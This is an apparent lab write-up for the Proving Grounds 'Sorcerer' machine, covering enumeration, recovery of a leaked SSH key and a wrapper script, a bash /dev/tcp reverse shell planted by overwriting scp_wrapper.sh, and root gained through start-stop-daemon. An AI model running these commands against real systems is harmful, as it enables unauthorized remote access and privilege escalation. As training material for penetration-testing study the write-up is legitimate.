#### Enumeration

##### Nmap 

```
nmap -Pn -p- -sC -sV 192.168.206.100 -T4 -oN Sorcerer.nmap
```
![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_20h04m29s_001_.png)

The website on 80 port only displays text messages, checking the code to confirm that it is only plain text.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_20h36m59s_009_.png)

No special directory was found during the scan.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_20h21m34s_002_.png)

The attempt to log in with common credentials failed.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_20h19m21s_003_.png)

Checking the code looks like the page is no actual login function.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_20h26m45s_006_.png)

If there is no actual login function, there may be hidden directories. The directory scan shows two directories zipfiles and default.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_20h31m18s_007_.png)

There are four compressed files in the zipfiles directory.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_20h51m19s_010_.png)

The default directory is the same as the website on port 80. It only displays text messages.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_20h55m00s_011_.png)

Find ssh folder in max.zip. When trying to login with private key, it is found that ssh login has been forbidden. Only scp can be used.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_23h58m36s_014_.png)

Try to use `scp` to upload and download website directories, but there is nothing special found, and PHP should not be able to use.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.27_00h01m13s_015_.png)

Reexamine scp_wrapper.sh in max.zip. After searching, I know that scp_wrapper.sh is used to set a program that does not allow ssh login. We can change scp_wrapper.sh to get the reverse shell.

scp_wrapper.sh: [setting reference](https://serverfault.com/questions/83856/allow-scp-but-not-actual-login-using-ssh) 

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.26_23h56m06s_013_.png)

Modify the source code of scp_wrapper.sh.

```
#!/bin/bash
/bin/bash -l > /dev/tcp/<LHOST>/<LPORT> 0<&1 2>&1
```
Then use the `scp` command to upload wrapper.sh with reverse shell content.

```
scp -i ~/Downloads/id_rsa ~/Documents/OffSecPG/Sorcerer/scp_wrapper.sh max@<RHOST>:/home/max
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.27_00h42m14s_016_.png)

Monitor port 80 to execute ssh login.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.27_00h46m13s_017_.png)

Get the reverse shell connection and local.txt successfully.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.27_00h48m49s_019_.png)

#### Privilege Escalation

The linpeas.sh find that /usr/sbin/start-stop-daemon is run by root.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.27_01h16m54s_020_.png)

Find instructions in [GTFOBins](https://gtfobins.github.io/) to elevate permissions.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.27_15h59m02s_001_.png)

```
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```
![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sorcerer/Sorcerer_2021.06.27_01h26m46s_022_.png)
